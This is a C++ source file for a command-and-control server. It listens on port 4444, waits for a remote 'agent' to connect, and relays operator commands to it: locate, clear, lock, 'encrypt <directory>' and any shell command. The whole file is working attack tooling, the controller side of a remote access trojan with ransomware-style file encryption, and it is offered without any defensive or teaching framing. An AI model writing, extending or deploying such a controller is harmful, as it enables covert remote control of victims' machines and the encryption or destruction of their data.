#include <iostream>
#include <string>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>

void handle_client(int client_sock) {
    char buffer[512];

    while (true) {
        std::cout << "Available commands:\n";
        std::cout << "1. locate\n";
        std::cout << "2. clear\n";
        std::cout << "3. lock\n";
        std::cout << "4. encrypt <directory>\n";
        std::cout << "5. <any shell command>\n";
        std::cout << "Enter command to send to agent (or 'exit' to quit): ";

        std::string command;
        std::getline(std::cin, command);

        if (command == "exit") {
            std::cout << "Exiting communication with agent." << std::endl;
            break;
        }

        send(client_sock, command.c_str(), command.length(), 0);

        int bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            std::cerr << "Error or connection closed by the agent." << std::endl;
            break;
        }

        buffer[bytes_received] = '\0'; // Null-terminate the response
        std::cout << "Agent's response: " << buffer << std::endl;
    }
}

int main() {
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock == -1) {
        std::cerr << "Failed to create socket." << std::endl;
        return 1;
    }

    sockaddr_in server_addr = {};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_sock, (sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        std::cerr << "Failed to bind to port 4444." << std::endl;
        close(server_sock);
        return 1;
    }

    if (listen(server_sock, SOMAXCONN) == -1) {
        std::cerr << "Failed to listen on socket." << std::endl;
        close(server_sock);
        return 1;
    }

    std::cout << "Server is running and waiting for a connection..." << std::endl;

    sockaddr_in client_addr = {};
    socklen_t client_size = sizeof(client_addr);
    int client_sock = accept(server_sock, (sockaddr*)&client_addr, &client_size);

    if (client_sock != -1) {
        std::cout << "Agent connected." << std::endl;
        handle_client(client_sock);
        close(client_sock);
    } else {
        std::cerr << "Failed to accept connection." << std::endl;
    }

    close(server_sock);
    return 0;
}
